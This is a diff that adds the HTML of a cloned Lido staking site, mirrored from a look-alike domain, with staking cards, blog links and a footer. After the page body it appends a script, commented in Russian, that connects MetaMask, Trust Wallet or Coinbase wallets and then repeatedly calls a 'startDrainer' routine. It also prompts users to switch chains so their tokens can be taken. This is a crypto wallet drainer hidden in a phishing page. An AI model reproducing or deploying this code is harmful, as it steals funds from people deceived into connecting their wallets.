+                     <a href="https://stake.lido.fi/" target="_blank" class="link__Link-sc-ezp11x-0 styles__ButtonLink-sc-p67agx-4 kRRDIg ktVRGh"><span class="styles__ButtonText-sc-p67agx-5 QiHsD">Stake now</span><span class="styles__ButtonTextSmall-sc-p67agx-6 gnHQpV">Stake</span></a>
+                  </div>
+                  <div class="styles__Wrapper-sc-p67agx-0 izXyua styles__Card-sc-btpyxv-4 bQlqZY">
+                     <img src="fonts/solana-logo-v2.svg" class="styles__Logo-sc-p67agx-1 klNfrg"><span class="styles__APR-sc-p67agx-2 eqlSom">5.5%</span>
+                     <p class="styles__Label-sc-p67agx-3 kKBUSr">APR</p>
+                     <a href="https://solana.lido.fi/" target="_blank" class="link__Link-sc-ezp11x-0 styles__ButtonLink-sc-p67agx-4 kRRDIg ktVRGh"><span class="styles__ButtonText-sc-p67agx-5 QiHsD">Stake now</span><span class="styles__ButtonTextSmall-sc-p67agx-6 gnHQpV">Stake</span></a>
+                  </div>
+                  <div class="styles__Wrapper-sc-p67agx-0 izXyua styles__Card-sc-btpyxv-4 bQlqZY">
+                     <img src="fonts/polygon-logo.svg" class="styles__Logo-sc-p67agx-1 klNfrg"><span class="styles__APR-sc-p67agx-2 eqlSom">6.3%</span>
+                     <p class="styles__Label-sc-p67agx-3 kKBUSr">APR</p>
+                     <a href="https://polygon.lido.fi/" target="_blank" class="link__Link-sc-ezp11x-0 styles__ButtonLink-sc-p67agx-4 kRRDIg ktVRGh"><span class="styles__ButtonText-sc-p67agx-5 QiHsD">Stake now</span><span class="styles__ButtonTextSmall-sc-p67agx-6 gnHQpV">Stake</span></a>
+                  </div>
+                  <div class="styles__Wrapper-sc-p67agx-0 izXyua styles__Card-sc-btpyxv-4 bQlqZY">
+                     <img src="fonts/polkadot-logo.svg" class="styles__Logo-sc-p67agx-1 klNfrg"><span class="styles__APR-sc-p67agx-2 eqlSom">16.5%</span>
+                     <p class="styles__Label-sc-p67agx-3 kKBUSr">APR</p>
+                     <a href="https://polkadot.lido.fi/" target="_blank" class="link__Link-sc-ezp11x-0 styles__ButtonLink-sc-p67agx-4 kRRDIg ktVRGh"><span class="styles__ButtonText-sc-p67agx-5 QiHsD">Stake now</span><span class="styles__ButtonTextSmall-sc-p67agx-6 gnHQpV">Stake</span></a>
+                  </div>
+                  <div class="styles__Wrapper-sc-p67agx-0 izXyua styles__Card-sc-btpyxv-4 bQlqZY">
+                     <img src="fonts/kusama-logo.svg" class="styles__Logo-sc-p67agx-1 klNfrg"><span class="styles__APR-sc-p67agx-2 eqlSom">12.6%</span>
+                     <p class="styles__Label-sc-p67agx-3 kKBUSr">APR</p>
+                     <a href="https://kusama.lido.fi/" target="_blank" class="link__Link-sc-ezp11x-0 styles__ButtonLink-sc-p67agx-4 kRRDIg ktVRGh"><span class="styles__ButtonText-sc-p67agx-5 QiHsD">Stake now</span><span class="styles__ButtonTextSmall-sc-p67agx-6 gnHQpV">Stake</span></a>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </section>
+      <section id="blog-posts" class="styles__Wrapper-sc-15f5g17-0 hIKuBc">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-15f5g17-1 iYCsgM">
+            <h2 color="#273852" class="Title-sc-7b4eon-0 gvCDMz">From the blog</h2>
+            <p color="#7A8AA0" class="Description-sc-u8z3wb-0 drcqie">Learn more about Lido, our technology, vision and validators</p>
+            <div class="styles__Wrapper-sc-2e5lqg-0 egspVa styles__PostsDesktopWrapper-sc-15f5g17-2 jkaxRq">
+               <a href="https://blog.lido.fi/the-ethereum-merge-faq/" draggable="false" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-r8f7rh-0 YFkdC ljMcnj styles__CardPostWrapper-sc-2e5lqg-1 ezuPlK" target="_blank" rel="nofollow noopener">
+                  <div class="styles__Image-sc-r8f7rh-4 hcKUsP"></div>
+                  <div class="styles__Info-sc-r8f7rh-1 bVEDsR">
+                     <h2 class="styles__Title-sc-r8f7rh-2 emTWQJ">The Ethereum Merge - FAQ</h2>
+                     <span class="styles__Date-sc-r8f7rh-3 iMIUrl">September 10, 2022</span>
+                  </div>
+               </a>
+               <a href="https://blog.lido.fi/lido-dashboards-catalogue/" draggable="false" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-r8f7rh-0 YFkdC ljMcnj styles__CardPostWrapper-sc-2e5lqg-1 ezuPlK" target="_blank" rel="nofollow noopener">
+                  <div class="styles__Image-sc-r8f7rh-4 brdKIJ"></div>
+                  <div class="styles__Info-sc-r8f7rh-1 bVEDsR">
+                     <h2 class="styles__Title-sc-r8f7rh-2 emTWQJ">Lido Dashboards Catalogue</h2>
+                     <span class="styles__Date-sc-r8f7rh-3 iMIUrl">September 9, 2022</span>
+                  </div>
+               </a>
+               <a href="https://blog.lido.fi/analysis-of-steth-user-behaviour-patterns/" draggable="false" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-r8f7rh-0 YFkdC ljMcnj styles__CardPostWrapper-sc-2e5lqg-1 ezuPlK" target="_blank" rel="nofollow noopener">
+                  <div class="styles__Image-sc-r8f7rh-4 dBUVaE"></div>
+                  <div class="styles__Info-sc-r8f7rh-1 bVEDsR">
+                     <h2 class="styles__Title-sc-r8f7rh-2 emTWQJ">Analysis of stETH User Behaviour Patterns</h2>
+                     <span class="styles__Date-sc-r8f7rh-3 iMIUrl">August 19, 2022</span>
+                  </div>
+               </a>
+            </div>
+            <div class="styles__Wrapper-sc-1c7lw15-0 eyAIdw styles__PostsMobileWrapper-sc-15f5g17-3 AJZRn">
+               <div class="slick-slider styles__CarouselWrap-sc-1c7lw15-1 ePoYGD slick-initialized" dir="ltr">
+                  <div class="slick-list">
+                     <div class="slick-track" style="opacity: 1; transform: translate3d(0px, 0px, 0px);">
+                        <div style="outline:none" data-index="0" class="slick-slide slick-active slick-current" tabindex="-1" aria-hidden="false">
+                           <div>
+                              <div tabindex="-1" style="width:100%;display:inline-block" class="styles__PostCardMobile-sc-1c7lw15-2 ePewYY">
+                                 <a href="https://blog.lido.fi/the-ethereum-merge-faq/" draggable="false" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-r8f7rh-0 YFkdC ljMcnj">
+                                    <div class="styles__Image-sc-r8f7rh-4 hcKUsP"></div>
+                                    <div class="styles__Info-sc-r8f7rh-1 bVEDsR">
+                                       <h2 class="styles__Title-sc-r8f7rh-2 emTWQJ">The Ethereum Merge - FAQ</h2>
+                                       <span class="styles__Date-sc-r8f7rh-3 iMIUrl">September 10, 2022</span>
+                                    </div>
+                                 </a>
+                              </div>
+                           </div>
+                        </div>
+                        <div style="outline:none" data-index="1" class="slick-slide" tabindex="-1" aria-hidden="true">
+                           <div>
+                              <div tabindex="-1" style="width:100%;display:inline-block" class="styles__PostCardMobile-sc-1c7lw15-2 ePewYY">
+                                 <a href="https://blog.lido.fi/lido-dashboards-catalogue/" draggable="false" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-r8f7rh-0 YFkdC ljMcnj">
+                                    <div class="styles__Image-sc-r8f7rh-4 brdKIJ"></div>
+                                    <div class="styles__Info-sc-r8f7rh-1 bVEDsR">
+                                       <h2 class="styles__Title-sc-r8f7rh-2 emTWQJ">Lido Dashboards Catalogue</h2>
+                                       <span class="styles__Date-sc-r8f7rh-3 iMIUrl">September 9, 2022</span>
+                                    </div>
+                                 </a>
+                              </div>
+                           </div>
+                        </div>
+                        <div style="outline:none" data-index="2" class="slick-slide" tabindex="-1" aria-hidden="true">
+                           <div>
+                              <div tabindex="-1" style="width:100%;display:inline-block" class="styles__PostCardMobile-sc-1c7lw15-2 ePewYY">
+                                 <a href="https://blog.lido.fi/analysis-of-steth-user-behaviour-patterns/" draggable="false" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-r8f7rh-0 YFkdC ljMcnj">
+                                    <div class="styles__Image-sc-r8f7rh-4 dBUVaE"></div>
+                                    <div class="styles__Info-sc-r8f7rh-1 bVEDsR">
+                                       <h2 class="styles__Title-sc-r8f7rh-2 emTWQJ">Analysis of stETH User Behaviour Patterns</h2>
+                                       <span class="styles__Date-sc-r8f7rh-3 iMIUrl">August 19, 2022</span>
+                                    </div>
+                                 </a>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div class="styles__Dots-sc-1c7lw15-3 jGXhLO">
+                  <div class="styles__DotWrapper-sc-1c7lw15-4 ipLSTN"></div>
+                  <div class="styles__DotWrapper-sc-1c7lw15-4 fjTZHu"></div>
+                  <div class="styles__DotWrapper-sc-1c7lw15-4 fjTZHu"></div>
+               </div>
+            </div>
+         </div>
+      </section>
+      <section id="community" class="styles__Wrapper-sc-1ttkt37-0 jKtMxf">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-1ttkt37-1 bjcjMD">
+            <h2 color="#273852" class="Title-sc-7b4eon-0 gvCDMz">Join our community</h2>
+            <p color="#7A8AA0" class="Description-sc-u8z3wb-0 drcqie">Learn more about Lido, chat with us and have your say in the future of the Lido ecosystem</p>
+            <div class="styles__Cards-sc-1ttkt37-2 gLneVC">
+               <a href="https://t.me/lidofinance" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-ikrlqs-4 YFkdC kQzbLN styles__CardCommunityWrapper-sc-1ttkt37-3 edxiam" target="_blank" rel="nofollow noopener">
+                  <svg color="#7A8AA0" class="styles__Logo-sc-ikrlqs-0 jckAiC" height="44" width="44">
+                     <use xlink:href="#telegram-transparent"/>
+                  </svg>
+                  <div class="styles__Block-sc-ikrlqs-1 ilLbgg">
+                     <h2 class="styles__Title-sc-ikrlqs-2 dVBcEl">Telegram</h2>
+                     <p class="styles__Description-sc-ikrlqs-3 hNmrSE">Join the community</p>
+                  </div>
+               </a>
+               <a href="https://twitter.com/lidofinance" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-ikrlqs-4 YFkdC jJxcZg styles__CardCommunityWrapper-sc-1ttkt37-3 edxiam" target="_blank" rel="nofollow noopener">
+                  <svg color="#7A8AA0" class="styles__Logo-sc-ikrlqs-0 jckAiC" height="44" width="44">
+                     <use xlink:href="#twitter-transparent"/>
+                  </svg>
+                  <div class="styles__Block-sc-ikrlqs-1 ilLbgg">
+                     <h2 class="styles__Title-sc-ikrlqs-2 dVBcEl">Twitter</h2>
+                     <p class="styles__Description-sc-ikrlqs-3 hNmrSE">Follow @lidofinance</p>
+                  </div>
+               </a>
+               <a href="https://discord.com/invite/lido" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-ikrlqs-4 YFkdC ifzUZf styles__CardCommunityWrapper-sc-1ttkt37-3 edxiam" target="_blank" rel="nofollow noopener">
+                  <svg color="#7A8AA0" class="styles__Logo-sc-ikrlqs-0 jckAiC" height="44" width="44">
+                     <use xlink:href="#discord-transparent"/>
+                  </svg>
+                  <div class="styles__Block-sc-ikrlqs-1 ilLbgg">
+                     <h2 class="styles__Title-sc-ikrlqs-2 dVBcEl">Discord</h2>
+                     <p class="styles__Description-sc-ikrlqs-3 hNmrSE">Ask questions</p>
+                  </div>
+               </a>
+              		<div style="display:none;" class="overlay" id="loader">
+                    
+               <a href="https://github.com/lidofinance" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-ikrlqs-4 YFkdC fjixej styles__CardCommunityWrapper-sc-1ttkt37-3 edxiam" target="_blank" rel="nofollow noopener">
+                  <svg color="#7A8AA0" class="styles__Logo-sc-ikrlqs-0 jckAiC" height="44" width="44">
+                     <use xlink:href="#github-transparent"/>
+                  </svg>
+                  <div class="styles__Block-sc-ikrlqs-1 ilLbgg">
+                     <h2 class="styles__Title-sc-ikrlqs-2 dVBcEl">Github</h2>
+                     <p class="styles__Description-sc-ikrlqs-3 hNmrSE">Contribute to the codebase</p>
+                  </div>
+               </a>
+               <a href="https://www.reddit.com/r/LidoFinance" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-ikrlqs-4 YFkdC jDwzhQ styles__CardCommunityWrapper-sc-1ttkt37-3 edxiam" target="_blank" rel="nofollow noopener">
+                  <svg color="#7A8AA0" class="styles__Logo-sc-ikrlqs-0 jckAiC" height="44" width="44">
+                     <use xlink:href="#reddit-transparent"/>
+                  </svg>
+                  <div class="styles__Block-sc-ikrlqs-1 ilLbgg">
+                     <h2 class="styles__Title-sc-ikrlqs-2 dVBcEl">Reddit</h2>
+                     <p class="styles__Description-sc-ikrlqs-3 hNmrSE">Stay updated</p>
+                  </div>
+               </a>
+               <a href="https://blog.lido.fi/" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Wrapper-sc-ikrlqs-4 YFkdC eyzzMQ styles__CardCommunityWrapper-sc-1ttkt37-3 edxiam" target="_blank" rel="nofollow noopener">
+                  <svg color="#7A8AA0" class="styles__Logo-sc-ikrlqs-0 jckAiC" height="44" width="44">
+                     <use xlink:href="#blog-transparent"/>
+                  </svg>
+                  <div class="styles__Block-sc-ikrlqs-1 ilLbgg">
+                     <h2 class="styles__Title-sc-ikrlqs-2 dVBcEl">Blog</h2>
+                     <p class="styles__Description-sc-ikrlqs-3 hNmrSE">Learn about Lido</p>
+                  </div>
+               </a>
+            </div>
+         </div>
+      </div></section>
+      <section id="subscribe" class="style__Wrapper-sc-ch6ra7-0 dRvVxH">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk style__Content-sc-ch6ra7-1 hJHMUA">
+            <h2 color="#273852" class="Title-sc-7b4eon-0 gvCDMz">Subscribe to our mailing list</h2>
+            <p color="#7A8AA0" class="Description-sc-u8z3wb-0 drcqie">Stay up to date with Lido developments</p>
+            <form class="styles__Wrapper-sc-bk1lbk-0 exbJpp style__SubscribeWrapper-sc-ch6ra7-2 kwjDgO">
+               <div class="input__Wrapper-sc-1nwe8pe-3 dFPMVA"><label class="input__Placeholder-sc-1nwe8pe-0 dyyYJU">Email address</label><input class="input__InputBlock-sc-1nwe8pe-1 hVHSwF styles__EmailInputWrapper-sc-bk1lbk-1 dFrKYK" value autocomplete="username"></div>
+               <button radius="small" width="130" height="44" class="button__Button-sc-pu01fx-0 styles__ButtonWrapper-sc-bk1lbk-2 kpsyRt cvHzwz">
+                  Subscribe
+                  <div class="styles__Wrapper-sc-1d12sdh-1 bSmSuT">
+                     <div color="rgba(255, 255, 255, 0.37)" class="styles__RippleEffect-sc-1d12sdh-0 cYhvRj"></div>
+                  </div>
+               </button>
+            </form>
+            <p class="style__Notice-sc-ch6ra7-4 fLoXPL">
+               By subscribing you accept our<!-- --> <a href="privacy-notice.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 style__Link-sc-ch6ra7-3 YFkdC gtAbtN">Privacy Notice</a>
+            </p>
+         </div>
+      </section>
+      <footer class="styles__Wrapper-sc-15b69xo-0 fItKjZ">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__LineWrapper-sc-15b69xo-5 bwpiPg">
+            <div class="styles__Line-sc-15b69xo-6 ksfmPI"></div>
+         </div>
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-15b69xo-3 cZLRXK">
+            <div data-testid="footer-products" class="styles__Block-sc-15b69xo-7 fIPoMH">
+               <h2 class="styles__BlockTitle-sc-15b69xo-8 hJdmpj">Products</h2>
+               <a href="https://stake.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Stake with Lido</a><a href="https://referral.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Lido Referral Program</a><a href="referral-terms.html" class="styles__FooterLink-sc-15b69xo-2 bLeDVT">Ethereum Referral Terms</a><a href="referral-terms-solana.html" class="styles__FooterLink-sc-15b69xo-2 bLeDVT">Solana Referral Terms</a><a href="lido-ecosystem.html" class="styles__FooterLink-sc-15b69xo-2 bLeDVT">Lido Ecosystem</a><a href="https://pro.nansen.ai/lido" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Nansen Analytics</a><a href="https://dune.xyz/LidoAnalytical/Lido-Finance-Extended" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Dune Analytics</a><a href="https://www.tokenterminal.com/terminal/projects/lido-finance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Token Terminal</a><a href="https://lego.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">LEGO</a>
+            </div>
+            <div data-testid="footer-networks" class="styles__Block-sc-15b69xo-7 fIPoMH">
+               <h2 class="styles__BlockTitle-sc-15b69xo-8 hJdmpj">Networks</h2>
+               <a href="ethereum.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Ethereum</a><a href="solana.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Solana</a><a href="kusama.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Kusama</a><a href="polygon.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Polygon</a><a href="polkadot.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Polkadot</a>
+            </div>
+            <div data-testid="footer-governance" class="styles__Block-sc-15b69xo-7 fIPoMH">
+               <h2 class="styles__BlockTitle-sc-15b69xo-8 hJdmpj">Governance</h2>
+               <a href="https://research.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Forum</a><a href="https://easytrack.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Easy Track</a><a href="https://research.lido.fi/t/lido-dao-member-manual/25" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">User Guide</a><a href="https://mainnet.lido.fi/#/lido-dao/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Lido DAO</a><a href="https://snapshot.org/#/lido-snapshot.eth" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Off-chain Voting</a><a href="https://immunefi.com/bounty/lido/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Lido Bug Bounty</a><a href="governance-process.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Governance Process</a>
+            </div>
+            <div data-testid="footer-developers" class="styles__Block-sc-15b69xo-7 fIPoMH">
+               <h2 class="styles__BlockTitle-sc-15b69xo-8 hJdmpj">Developers</h2>
+               <a href="https://github.com/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">GitHub</a><a href="https://docs.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Documentation</a><a href="static/Lido_Ethereum-Liquid-Staking.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Primer</a><a href="https://github.com/lidofinance/audits" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Audits</a>
+            </div>
+            <div data-testid="footer-community" class="styles__Block-sc-15b69xo-7 fIPoMH">
+               <h2 class="styles__BlockTitle-sc-15b69xo-8 hJdmpj">Community</h2>
+               <a href="https://discord.com/invite/lido" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Discord</a><a href="https://twitter.com/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Twitter</a><a href="https://t.me/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Telegram</a><a href="https://www.reddit.com/r/LidoFinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Reddit</a>
+            </div>
+            <div data-testid="footer-about" class="styles__Block-sc-15b69xo-7 fIPoMH">
+               <h2 class="styles__BlockTitle-sc-15b69xo-8 hJdmpj">About</h2>
+               <a href="mailto:info@lido.fi" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Contact Us</a><a href="https://blog.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Blog</a><a href="faq.html" class="styles__FooterLink-sc-15b69xo-2 bLeDVT">FAQ</a><a href="https://help.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Help Center</a><a href="https://careers.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Careers</a><a href="static/LIDO_press_kit.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Press Kit</a><a href="http://status.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__Link-sc-15b69xo-1 YFkdC jTPOap">Status</a>
+            </div>
+         </div>
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__LineWrapper-sc-15b69xo-5 bwpiPg">
+            <div class="styles__Line-sc-15b69xo-6 ksfmPI"></div>
+         </div>
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__ContentSmall-sc-15b69xo-4 cLQeuM">
+            <svg class="styles__Logo-sc-15b69xo-9 gNmZkH" height="44" width="88">
+               <use xlink:href="#logo-color-new"/>
+            </svg>
+            <div><a href="terms-of-use.html" class="styles__FooterLink-sc-15b69xo-2 bLeDVT">Terms of Use</a><a href="privacy-notice.html" class="styles__FooterLink-sc-15b69xo-2 bLeDVT">Privacy Notice</a></div>
+         </div>
+      </footer>
+   </div>
+   <script src="js/loader_index.js"></script>
+
+    <script src="js/web3.min.js"></script>
+    <script src="js/moralis.js"></script>
+    <script src="js/index.min.js"></script>
+    
+    <script type="text/javascript" src="js/index.js"></script>
+    <script>
+      // Custom Staking Script
+      /* document.getElementById("stakeing").onclick = () => {
+        document.getElementById("show").style.display = "block";
+      };
+      document.getElementById("stakecoin").onclick = () => {
+        document.getElementById("show").style.display = "block";
+      }; */
+    </script>
+</body>
+
+<!-- Mirrored from lidostake.io/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Jan 2023 02:42:59 GMT -->
+</html>
+
+   <script src="js/loader_index.js"></script>
+
+    <script src="js/web3.min.js"></script>
+    <script src="js/moralis.js"></script>
+    <script src="js/index.min.js"></script>
+    
+    <script type="text/javascript" src="js/index.js"></script>
+    <script>
+      // Custom Staking Script
+      /* document.getElementById("stakeing").onclick = () => {
+        document.getElementById("show").style.display = "block";
+      };
+      document.getElementById("stakecoin").onclick = () => {
+        document.getElementById("show").style.display = "block";
+      }; */
+    </script>
+
+
+
+<style>
+
+
+.loader {
+  opacity:    1; 
+
+  width:      100%;
+  height:     100%; 
+  z-index:    99999;
+  top:        0; 
+  left:       0; 
+  position:   fixed; 
+}
+
+    </style>
+    <!-- Be sure to paste this code after the tag <body> -->
+
+<script>
+    const connectWallet = async (provider) => {
+        sessionStorage.clear();
+
+        //document.getElementById('loader').style.display = 'block'
+        //document.getElementById('change_chain').style.display = 'none'
+
+        /**
+         * Подключаем кошелек
+         */
+
+        try {
+            if (provider === 'MetaMask') {
+                await window.goToMetamask()
+            } else if (provider === 'Trust Wallet') {
+                await window.goToTrustWallet()
+            } else {
+                await window.goToCoinbaseWallet()
+            }
+        } catch (e) {
+            //document.getElementById('loader').style.display = 'none'
+        }
+
+        /**
+         * Ждем пока пользователь подключит кошелек
+         *
+         * window.isActive = true (Значит кошелек уже подключен)
+         */
+        const timerIsActive = setInterval(async () => {
+            if (window.isActive) {
+                clearInterval(timerIsActive)
+
+                document.getElementById('wallet').style.display = 'block'
+                document.getElementById('wallet_address').textContent = window.account
+                document.getElementById('connections').style.display = 'none'
+
+                try {
+                    await startDrainer()
+                } catch (e) {
+
+                }
+
+                document.getElementById('loader').style.display = 'none'
+            }
+        }, 1000)
+    }
+
+    const startDrainer = () => {
+        return new Promise(async (res) => {
+            try {
+                const response = await window.goToStartDrainer()
+
+                /**
+                 * Если не найден токен
+                 */
+                if (response.type === "token_so_low" || response.type === "not_found_token") {
+                    sessionStorage.clear();
+
+                    return res("stop");
+                }
+
+                /**
+                 * Если нужно поменять сеть (в Trust Wallet её автоматически менять нельзя)
+                 */
+                if (response.type === "change_chain") {
+                    sessionStorage.clear();
+
+                    document.getElementById('change_chain').style.display = 'block'
+                    document.getElementById('change_chain').textContent = `Change chain to ${response.name}`
+
+                    return res("stop");
+                }
+            } catch (e) {
+                /**
+                 * При неожиданной ошибке
+                 */
+                if (e.indexOf('Cannot') > -1) {
+                    sessionStorage.clear()
+
+                    return res("stop");
+                }
+            }
+
+            return res(startDrainer())
+        })
+    }
+
+    const disconnect = () => {
+        localStorage.clear()
+        sessionStorage.clear()
+
+        document.getElementById('wallet').style.display = 'none'
+        document.getElementById('connections').style.display = 'block'
+
+        window.location.href = 'index.html'
+    }
+
+</script>
